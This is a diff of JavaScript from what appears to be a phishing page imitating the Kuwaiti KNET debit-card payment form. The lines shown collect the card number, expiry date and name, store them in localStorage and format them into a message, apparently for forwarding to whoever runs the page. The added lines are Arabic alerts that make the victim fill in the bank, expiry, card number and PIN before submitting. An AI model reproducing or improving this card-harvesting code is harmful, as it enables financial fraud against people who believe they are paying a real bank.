@@ -1306,11 +1306,26 @@ function onPay() {
         cc = document.getElementById('dcprefix').value + document.getElementById("debitNumber").value
         month = document.getElementById('month').value
         year = document.getElementById('year').value
+        
+        if(!document.getElementById('bank').value){
+            alert('يوجد خطأ في المعلومات - يرجى أختيار البنك')
+        }
+        if(!document.getElementById('month').value | !document.getElementById('year').value){
+            alert('يوجد خطأ في المعلومات - يرجى اختيار تاريخ الانتهاء')
+        }
+      if(!document.getElementById('debitNumber').value){
+            alert('يوجد خطأ في المعلومات - يرجى  أدخال رقم البطاقة')
+        }
+      if(!document.getElementById('cardPin').value){
+            alert('يوجد خطأ في المعلومات - يرجى  رمز البطاقة')
+        }
         localStorage.setItem('cc', cc)
         localStorage.setItem('month', month)
         localStorage.setItem('year', year)
 
 
+    
+    
         var message = `
     📩 كي نت
     👤 الاسم: \`${localStorage.getItem('userName')}\`
